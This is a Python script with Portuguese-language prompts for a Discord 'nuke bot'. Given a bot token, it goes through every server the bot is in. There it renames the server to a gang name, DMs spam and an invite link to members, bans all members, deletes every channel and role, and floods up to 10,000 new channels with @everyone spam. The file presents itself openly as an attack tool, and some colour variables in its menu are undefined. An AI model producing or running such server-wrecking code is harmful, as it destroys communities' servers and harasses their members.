import discord
from discord.ext import commands
from colorama import init, Fore as cc
from os import name as os_name, system
from sys import exit
import asyncio
import threading
from tqdm import tqdm

init()

# Definição das cores
r = cc.LIGHTRED_EX
g = cc.LIGHTGREEN_EX
w = cc.RESET
y = cc.LIGHTYELLOW_EX

clear = lambda: system('cls') if os_name == 'nt' else system('clear')
def _input(text): print(text, end=''); return input()

baner = f'''
{r}██████╗     ██╗  ██╗
{r}██╔══██╗    ██║ ██╔╝
{r}██║  ██║    █████╔╝ 
{r}██║  ██║    ██╔═██╗ 
{r}██████╔╝    ██║  ██╗
{r}╚═════╝     ╚═╝  ╚═╝
{y}Feito por: {g}Menor dk'''

async def delete_all_channels(guild):
    deleted = 0
    for channel in guild.channels:
        try:
            await channel.delete()
            deleted += 1
        except:
            continue
    return deleted

async def delete_all_roles(guild):
    deleted = 0
    for role in guild.roles:
        try:
            await role.delete()
            deleted += 1
        except:
            continue
    return deleted

async def ban_all_members(guild):
    banned = 0
    for member in guild.members:
        try:
            await member.ban()
            banned += 1
        except:
            continue
    return banned

async def send_direct_message(member, message):
    try:
        await member.send(message)
    except:
        pass

async def notify_members(guild, message):
    for member in guild.members:
        if not any(permission in member.guild_permissions for permission in ['kick_members', 'ban_members']) and not any(role.permissions.administrator for role in member.roles):
            await send_direct_message(member, message)

async def create_text_channels_and_send_messages(guild, name, message, stop_event):
    created = 0
    total_channels = 0
    
    while total_channels < 10000 and not stop_event.is_set():
        tasks = []
        for _ in range(10):
            if total_channels >= 10000 or stop_event.is_set():
                break
            try:
                channel = await guild.create_text_channel(name=name)
                tasks.append(asyncio.create_task(send_messages(channel, message)))
                created += 1
                total_channels += 1
            except:
                continue
        
        await asyncio.gather(*tasks)
        await asyncio.sleep(2)
    
    return created

async def send_messages(channel, message):
    for _ in range(10):
        try:
            await channel.send(message)
        except:
            continue

async def nuke_guild(guild, name, message, stop_event):
    print(f'{r}Iniciando Nuke no servidor: {y}{guild.name}')
    await guild.edit(name="TERCEIRO COMANDO DA CAPITAL 🇮🇶")
    
    await notify_members(guild, message)
    
    banned = await ban_all_members(guild)
    deleted_channels = await delete_all_channels(guild)
    delete_roles = await delete_all_roles(guild)
    created_text_channels = await create_text_channels_and_send_messages(guild, name, message, stop_event)
    
    print(f'{g}Servidor {w}{guild.name}{g} atualizado com sucesso!')
    print(f'{y}Usuários banidos: {g}{banned}')
    print(f'{y}Canais deletados: {g}{deleted_channels}')
    print(f'{y}Papéis deletados: {g}{delete_roles}')
    print(f'{y}Canais de texto criados: {g}{created_text_channels}')
    print(f'{r}--------------------------------------------\n\n')

def stop_bot(stop_event):
    while True:
        choice = _input(f'''
{baner}                
{c}--------------------------------------------
{b}[Menu]
    {y}└─[1] {m}- {g}Executar Setup Nuke Bot
    {y}└─[2] {m}- {g}Sair
    {y}└─[3] {m}- {g}Parar
{y}====>{g}''')
        if choice == '1':
            return
        elif choice == '2':
            print(f'{dr}Saindo...')
            exit()
        elif choice == '3':
            stop_event.set()
            print(f'{dr}Parando...')
            return

async def main(token, name, message, stop_event):
    client = commands.Bot(command_prefix='.', intents=discord.Intents.all())
    
    @client.event
    async def on_ready():
        print(f'''
[+] Logado como {client.user.name}
[+] Bot em {len(client.guilds)} servidores!''')
        if stop_event.is_set():
            await client.close()
            return
        
        for guild in client.guilds:
            await nuke_guild(guild, name, message, stop_event)
            if stop_event.is_set():
                break
        
        await client.close()

    try:
        await client.start(token)
    except Exception as error:
        if str(error) == "Shard ID None is requesting privileged intents that have not been explicitly enabled in the developer portal. It is recommended to go to https://discord.com/developers/applications/ and explicitly enable the privileged intents within your application's page. If this is not possible, then consider disabling the privileged intents instead.":
            input(f'{r}Erro de Intents\n{g}Para corrigir -> https://prnt.sc/wmrwut\n{b}Pressione Enter para retornar...')
        else:
            input(f'{r}{error}\n{b}Pressione Enter para retornar...')

if __name__ == '__main__':
    stop_event = threading.Event()
    
    stop_thread = threading.Thread(target=stop_bot, args=(stop_event,))
    stop_thread.start()
    
    token = _input(f'{y}Insira o token do bot:{g}')
    name = _input(f'{y}Insira o nome para os canais criados:{g}')
    message = f'@everyone @here\n\n# DKZIN DOMINA\nhttps://discord.com/invite/gZSx3n8Csa\n\n## TERCEIRO COMANDO NA FRENTE DE TODOS'
    
    asyncio.run(main(token, name, message, stop_event))
    stop_thread.join()
